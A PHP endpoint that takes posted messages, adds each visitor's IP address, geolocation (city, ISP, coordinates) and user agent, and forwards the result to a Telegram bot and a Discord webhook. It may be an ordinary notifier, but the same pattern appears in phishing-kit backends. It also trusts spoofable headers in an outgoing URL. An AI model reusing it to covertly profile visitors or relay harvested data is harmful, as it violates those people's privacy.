<?php
// Get POST data
$data = json_decode(file_get_contents('php://input'), true);

// Fetch IP address from server variables
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}
$ip = getUserIP();

// Fetch IP details from ipapi.co
$ipapi_url = "https://ipapi.co/{$ip}/json/";
$ipapi_response = @file_get_contents($ipapi_url);
$ipapi_data = $ipapi_response ? json_decode($ipapi_response, true) : [];

$locationLines = [];
if (!empty($ipapi_data['city']) && !empty($ipapi_data['region']) && !empty($ipapi_data['country_name'])) {
    $locationLines[] = $ipapi_data['city'] . ', ' . $ipapi_data['region'] . ', ' . $ipapi_data['country_name'];
} elseif (!empty($ipapi_data['country_name'])) {
    $locationLines[] = $ipapi_data['country_name'];
}
if (!empty($ipapi_data['country'])) {
    $locationLines[] = "Country Code: " . $ipapi_data['country'];
}
if (!empty($ipapi_data['postal'])) {
    $locationLines[] = "Postal: " . $ipapi_data['postal'];
}
if (!empty($ipapi_data['org'])) {
    $locationLines[] = "ISP: " . $ipapi_data['org'];
}
if (!empty($ipapi_data['asn'])) {
    $locationLines[] = "ASN: " . $ipapi_data['asn'];
}
if (!empty($ipapi_data['timezone'])) {
    $locationLines[] = "Timezone: " . $ipapi_data['timezone'];
}
if (!empty($ipapi_data['latitude']) && !empty($ipapi_data['longitude'])) {
    $locationLines[] = "Lat/Lon: " . $ipapi_data['latitude'] . ", " . $ipapi_data['longitude'];
}
$location = implode("\n", $locationLines);

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Telegram
$telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN';
$chatId = 'YOUR_CHAT_ID';
$telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage";
$telegramMessage = $data['telegram_message'] ?? '';
if ($telegramMessage) {
    $telegramMessage .= "\n🌐 IP: $ip";
    if ($location) {
        $telegramMessage .= "\n📍 Location Info:\n$location";
    }
    if ($userAgent) {
        $telegramMessage .= "\n🖥️ User Agent: $userAgent";
    }
    file_get_contents($telegramUrl . '?chat_id=' . $chatId . '&text=' . urlencode($telegramMessage) . '&parse_mode=Markdown');
}

// Discord
$discordWebhook = 'YOUR_DISCORD_WEBHOOK_URL';
$discordMessage = $data['discord_message'] ?? '';
if ($discordMessage) {
    $discordMessage .= "\n🌐 IP: $ip";
    if ($location) {
        $discordMessage .= "\n📍 Location Info:\n$location";
    }
    if ($userAgent) {
        $discordMessage .= "\n🖥️ User Agent: $userAgent";
    }
    $payload = json_encode(['content' => $discordMessage]);
    $ch = curl_init($discordWebhook);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

echo json_encode(['status' => 'ok']);
?>
